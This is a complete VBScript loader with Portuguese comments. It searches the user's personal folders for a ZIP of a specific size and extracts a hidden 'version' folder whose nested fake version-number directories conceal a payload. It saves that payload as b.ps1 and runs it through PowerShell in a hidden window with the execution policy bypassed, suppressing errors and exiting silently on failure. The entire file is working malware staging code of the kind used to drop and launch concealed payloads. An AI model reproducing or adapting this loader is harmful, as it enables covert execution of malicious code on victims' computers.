' ====================================================================
' SCRIPT UNIFICADO: EXTRAÇÃO SELETIVA, GRAVAÇÃO COM BOM E EXECUÇÃO
' ====================================================================
Dim sh, fso, shellApp
Set sh = CreateObject("WScript.Shell")
Set fso = CreateObject("Scripting.FileSystemObject")
Set shellApp = CreateObject("Shell.Application")

' 1. Captura dos caminhos das variáveis de ambiente
Dim userProfile, tempDir
userProfile = sh.ExpandEnvironmentStrings("%USERPROFILE%")
tempDir = sh.ExpandEnvironmentStrings("%TEMP%")

' 2. Mapeamento dos diretórios de busca do arquivo compactado
Dim pastas(4)
pastas(0) = userProfile & "\Desktop"
pastas(1) = userProfile & "\Downloads"
pastas(2) = userProfile & "\Documents"
pastas(3) = userProfile & "\Pictures"
pastas(4) = userProfile & "\Music"

' 3. Configuração de limites de tamanho (em bytes: de 290KB a 310KB)
Dim tamanhoMin, tamanhoMax
tamanhoMin = 294 * 1024 ' 296.960 bytes
tamanhoMax = 310 * 1024 ' 317.440 bytes

' 4. Varredura e identificação do arquivo ZIP correspondente nas pastas
Dim pastaAlvo, arquivo, zipEncontrado, caminhoZip
zipEncontrado = False

For i = 0 To UBound(pastas)
    If fso.FolderExists(pastas(i)) Then
        Set pastaAlvo = fso.GetFolder(pastas(i))
        For Each arquivo In pastaAlvo.Files
            ' Verifica a extensão .zip e valida a faixa de tamanho estipulada
            If LCase(fso.GetExtensionName(arquivo.Name)) = "zip" Then
                If arquivo.Size >= tamanhoMin And arquivo.Size <= tamanhoMax Then
                    caminhoZip = arquivo.Path
                    zipEncontrado = True
                    Exit For
                End If
            End If
        Next
    End If
    If zipEncontrado Then Exit For
Next

' 5. Processamento do arquivo ZIP (Extração SELETIVA da pasta version)
If zipEncontrado Then
    On Error Resume Next
    
    Dim objSource, objTarget, pastaVersionDentroDoZip
    Set objSource = shellApp.NameSpace(caminhoZip)
    Set objTarget = shellApp.NameSpace(tempDir)
    
    If Not objSource Is Nothing And Not objTarget Is Nothing Then
        ' Filtra o índice interno do ZIP pelo nome exato da pasta "version"
        Set pastaVersionDentroDoZip = objSource.ParseName("version")
        
        If Not pastaVersionDentroDoZip Is Nothing Then
            ' Extrai APENAS a pasta "version" para o diretório %TEMP%
            objTarget.CopyHere pastaVersionDentroDoZip, 16 + 4
        End If
    End If
    
    ' Aguarda o término da gravação física dos arquivos extraídos no disco
    WScript.Sleep 2000
    On Error GoTo 0
End If

' 6. Mapeamento dos caminhos pós-extração e preparação do destino
Dim CaminhoOrigem, PastaDestino, NomeFinal, DestinoFinal, ExecPowerShell

' Caminho até o arquivo de dados sem extensão dentro da árvore de diretórios extraída
CaminhoOrigem = tempDir & "\version\1.0.8.2\1.0.7.2\1.0.5.5\1.0.4.7\1.0.9.6\1.0.8.4\version_1.0.8.4"
PastaDestino = userProfile & "\"
NomeFinal = "b.ps1"
DestinoFinal = PastaDestino & NomeFinal

' 7. Verificação de existência e transferência do script convertendo para UTF-8 com BOM
If fso.FileExists(CaminhoOrigem) Then
    
    ' Limpeza preventiva de possíveis versões anteriores do b.ps1 no destino
    On Error Resume Next
    If fso.FileExists(DestinoFinal) Then
        fso.DeleteFile DestinoFinal, True
    End If
    On Error GoTo 0
    
    ' Inicializa os fluxos de memória para re-gravação correta dos caracteres
    On Error Resume Next
    Dim objStreamIn, objStreamOut
    Set objStreamIn = CreateObject("ADODB.Stream")
    Set objStreamOut = CreateObject("ADODB.Stream")
    
    ' Configura o fluxo de entrada para ler o arquivo temporário original
    objStreamIn.Type = 2 ' Define como modo Texto
    objStreamIn.Charset = "utf-8"
    objStreamIn.Open
    objStreamIn.LoadFromFile CaminhoOrigem
    
    ' Configura o fluxo de saída para gravar o arquivo b.ps1 final
    objStreamOut.Type = 2 ' Define como modo Texto
    objStreamOut.Charset = "utf-8" ' O componente ADODB força a gravação do cabeçalho BOM automaticamente em modo UTF-8
    objStreamOut.Open
    
    ' Transfere o conteúdo processado e salva estruturado no disco
    objStreamOut.WriteText objStreamIn.ReadText
    objStreamOut.SaveToFile DestinoFinal, 2 ' 2 = Força a substituição se existir
    
    ' Encerra os fluxos de dados de forma limpa
    objStreamIn.Close
    objStreamOut.Close
    On Error GoTo 0
    
    ' 8. Validação e Execução do script PowerShell gerado com suporte total a acentos
    If fso.FileExists(DestinoFinal) Then
        ' Configura os argumentos de execução ignorando perfis locais e políticas restritivas
        ExecPowerShell = "powershell.exe -NoProfile -ExecutionPolicy Bypass -File """ & DestinoFinal & """"
        
        ' Executa a rotina. O parâmetro 0 mantém a janela oculta e False libera o VBScript imediatamente
        sh.Run ExecPowerShell, 0, False
    End If

Else
    ' Encerramento silencioso de contingência caso o arquivo extraído não tenha sido gerado
    WScript.Quit
End If

' 9. Limpeza de referências de objetos da memória
Set sh = Nothing
Set fso = Nothing
Set shellApp = Nothing
